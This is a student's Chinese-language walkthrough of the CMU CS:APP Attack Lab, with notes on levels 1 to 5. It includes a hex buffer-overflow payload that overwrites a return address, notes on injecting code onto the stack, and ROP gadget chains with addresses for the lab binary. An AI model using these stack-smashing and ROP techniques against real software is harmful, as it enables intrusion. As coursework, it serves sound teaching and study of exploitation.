# CMU CSAPP lab 3: attack lab
## level 1
所用工具
- objdump -d
- gdb

目标是修改getbuf函数中的ret之后的位置。（writeup）

暴力解法：(1h)
- 不停地尝试输入字符串，需要被修改的地址躺在40Byte远的地方，于是输入: 带星号的是touch1的地址。
```hex
11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 *00 c0 17 40 00 00 00 00 00*
```

理论解法：
getbuf 中为数据预留了0x28个Byte的位置，也就是40个Byte
```asm
sub    $0x28,%rsp
```

小结：
此题用到了简单的修改return地址。C3 ret的原理就是pop rip。所以将栈上的地址修改为想要的新rip，既能完成攻击。攻击的前提是：知道目标地址。此处程序地址没有随机（被老师有意关闭了），所以是固定的。若不固定，可以通过相对地址推算。

## level 2
工具
- 想植入 instruction 就需要它对应的 byte code 。 可以写汇编->编译->反编译查看

```bash
 gcc -c xxx.s -o xxx
 objdump -d xxx > xxxx.s 
```


write up 的提示很到位。此题需要在栈上写入代码，并返回到栈上执行。RECALL: stack只是一块memory。此安全问题已被很好解决：即设置memory page的可执行位，stack page 为不可执行。
所以前提：关闭 stack page 不可执行的安全选项。。

## level 3
踩坑：想要攻击的函数若调用别的函数可能覆盖 stack 上你的攻击代码。

## level 4
gadget 1: 4019ab pop %rax

gadget 2: 4019a3 movl %rax,%edi

touch2

## level 5
有两种可能路径：
1. 找到原有代码中，cookie的地址。
2. 想办法动态取出随机后的栈地址。

第二种比较自然

尝试找出farm中所有在表内的gadget:
```
401a06 movq %rsp %rax
4019a2 movq %rax %rdi

401a3c: movl %esp %eax
401a42: movl %eax %edx
401a34: movl %edx %ecx
401a13: movl %ecx %esi

4019ab pop %rax

4019dc: popq %rsp 4019dd: movl %eax %edx
```
发现可以用movq %rsp %rax 把地址拿出来，但是我们还需要对地址进行加减，否则不能指定到想要的存cookie的位置。

于是再次观察farm，发现有一个函数本身就有用：
```
4019d6 add_xy
```
此时我想用以下的方式构建答案byte code：
```
401a06 movq %rsp %rax
4019a2 movq %rax %rdi
4019ab pop %rax
cookie
401a00 nop (start with 00)
4019ab pop %rax
16
401a42 movl %eax %edx
401a34 movl %edx %ecx
401a13 movl %ecx %esi
4019d6 add_xy
4019a2 touch3
```
其中 nop 的加入是为了让 cookie 字串以 0 为结束。
但是这个方法会seg fault。。。之后再分析

更好的答案是把 cookie 字串放在最后让后添 0
```
401a06 movq %rsp %rax
4019a2 movq %rax %rdi
401a00 nop (start with 00)
4019ab pop %rax
0x48
401a42 movl %eax %edx
401a34 movl %edx %ecx
401a13 movl %ecx %esi
4019d6 add_xy
4019a2 touch3
cookie 
00
```

### seg fault 分析
1. 可能是因为输入太长了，覆盖了什么东西？
    - 把标准答案后再添了点东西，发现并不会造成 seg fault 不是这个原因。
2. 猜测是栈顶释放掉空间属于是别人的了，所以要把未来要用的数据藏在栈底。
